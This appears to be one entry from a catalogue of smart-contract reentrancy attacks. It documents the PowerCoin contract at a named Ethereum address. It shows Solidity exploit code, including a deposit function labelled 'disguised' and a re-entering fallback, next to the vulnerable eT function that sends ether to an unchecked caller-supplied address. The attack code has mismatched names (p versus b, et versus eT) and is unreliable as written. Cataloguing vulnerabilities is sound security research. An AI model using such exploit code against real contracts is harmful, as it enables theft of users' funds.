#########
Attack 14
#########

**Contract Name**

PowerCoin

**Contract Address**

0x5689774160fb27235337d328b45664e0d33f05c1

**Transaction Count**

1

**Invovled Ethers**

0 Ethers

**Length of the Call Chain**

1 external function

**Victim Function**

``eT``

**Attack Mechanisim**

Attack code:
::

    contract Attack is IERC20Token{
        PowerCoin p = new PowerCoin();
        constructor() payable {}

        function deposit() public {   // Disguised attack function
            //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
            b.et(this, 10, 10);
        }

        function() payable {
            b.et(this, 10, 10);
        }

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract PowerCoin is Ownable, StandardToken {
        string public name = "CapricornCoin";
        string public symbol = "CCC";
        uint public decimals = 18;                  // token has 18 digit precision

        uint public totalSupply = 10 * (10**6) * (10**18);  // 10 Million Tokens

        event ET(address indexed _pd, uint _tkA, uint _etA);

        function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
            balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
            balances[_pd] = safeAdd(balances[_pd], _tkA);
            if (!_pd.call.value(_etA)()) revert();
            ET(_pd, _tkA, _etA);
            return true;
        }
    }

In this case, the attacker can lauch reentrancy attack by calling ``_pd.call.value(_etA)()``, because ``_pd`` is tainted and there are not any conditions to check the value of transaction destination. 

**Attack.** The attacker can call ``deposit`` to start attack.